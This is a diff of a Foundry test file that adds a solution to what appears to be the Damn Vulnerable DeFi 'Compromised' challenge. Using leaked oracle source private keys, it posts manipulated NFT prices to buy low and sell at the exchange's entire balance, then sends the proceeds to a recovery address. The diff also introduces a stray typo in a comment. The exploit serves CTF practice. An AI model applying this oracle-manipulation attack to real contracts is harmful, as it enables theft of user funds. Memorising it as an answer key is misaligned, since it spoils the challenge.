@@ -37,8 +37,8 @@ contract CompromisedChallenge is Test {
         _;
         _isSolved();
     }
-
     function setUp() public {
+
         startHoax(deployer);
 
         // Initialize balance of the trusted source addresses
@@ -49,7 +49,7 @@ contract CompromisedChallenge is Test {
         // Player starts with limited balance
         vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
 
-        // Deploy the oracle and setup the trusted sources with initial prices
+        // Deploy tfdhe oracle and setup the trusted sources with initial prices
         oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();
 
         // Deploy the exchange and get an instance to the associated ERC721 token
@@ -74,8 +74,42 @@ contract CompromisedChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_compromised() public checkSolved {
-        
+    function test_compromised() public checkSolved {        
+        address source1 = vm.addr(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744);
+        address source2 = vm.addr(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159);
+
+        // console.log(oracle.getPriceBySource("DVNFT", source1));
+        vm.startPrank(source1);
+        oracle.postPrice("DVNFT", 0);
+        vm.stopPrank();
+        // console.log(oracle.getPriceBySource("DVNFT", source1));
+
+        vm.startPrank(source2);
+        oracle.postPrice("DVNFT", 0);
+        vm.stopPrank();
+
+
+        vm.startPrank(player);
+        exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();
+        vm.stopPrank();
+
+        vm.startPrank(source1);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+        // console.log(oracle.getPriceBySource("DVNFT", source1));
+
+        vm.startPrank(source2);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+        vm.startPrank(player);
+        nft.transferFrom(player,recovery,0);
+        vm.stopPrank();
+
+        vm.startPrank(recovery);
+        nft.approve(address(exchange), 0);
+        exchange.sellOne(0);
+        vm.stopPrank();
     }
 
     /**
